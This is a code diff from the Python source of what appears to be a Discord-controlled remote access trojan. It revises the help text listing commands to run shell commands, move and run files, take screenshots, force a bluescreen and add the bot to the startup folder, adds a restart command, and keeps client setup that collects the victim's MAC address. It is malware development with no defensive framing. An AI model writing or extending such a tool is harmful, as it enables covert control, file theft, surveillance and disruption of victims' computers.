@@ -33,29 +33,32 @@ Y88b  d88P 888 Y88b 888 Y88b.  888  888 Y8b.     888     Y88b  d88P Y88..88P 888
     .ping               - latency delay of the bot
     .cd <directory>     - Change Directory   
     .ls                 - List Directory
-    .download <file>    - Download File   
+    .download <file>    - Download File into link
     .upload <link>      - Upload File from link
     .cmd <cmd>          - Execute CMD Command 
     .run <file>         - Run an File   
     .screenshot OR .ss  - Take a Screenshot of the first monitor
     .blue               - sends a bluescreen ;)
     .start              - Adds the bot to the startup directory
-    .exit               - closes the connection to the bot                                             
+    .exit               - closes the connection to the bot  
+    .restart            - restarts the connection to the bot                                           
 """
 commands = "\n".join([
-    "help - Help Command",
-    "ping - Ping Command",
-    "cd - Change Directory",
-    "ls - List Directory",
-    "download <file> - Download File",
-    "upload <link> - Upload File",
-    "cmd - Execute CMD Command",
-    "run <file> - Run an File",
-    "screenshot - Take a Screenshot",
-    "blue - DeadScreen",
-    "start - Add To start",
-    "exit - Exit The Session",
+    ".help               - Shows this message",
+    ".ping               - latency delay of the bot",
+    ".cd <directory>     - Change Directory",
+    ".ls                 - List Directory",
+    ".download <file>    - Download File into link",
+    ".upload <link>      - Upload File from link",
+    ".cmd <cmd>          - Execute CMD Command",
+    ".run <file>         - Run an File",
+    ".ss                 - Take a Screenshot of the first monitor",
+    ".blue               - sends a bluescreen ;)",
+    ".start              - Adds the bot to the startup directory",
+    ".exit               - closes the connection to the bot",
+    ".restart            - restarts the connection to the bot"
 ])
+
 intents = discord.Intents.all()
 intents.members = True
 client = discord.Client(intents=intents)
@@ -64,6 +67,7 @@ async def find_channel_by_name(guild, channel_name):
         if channel.name == channel_name:
             return channel
     return None
+
 global mac_address
 mac_address = str(get_mac())
 @client.event
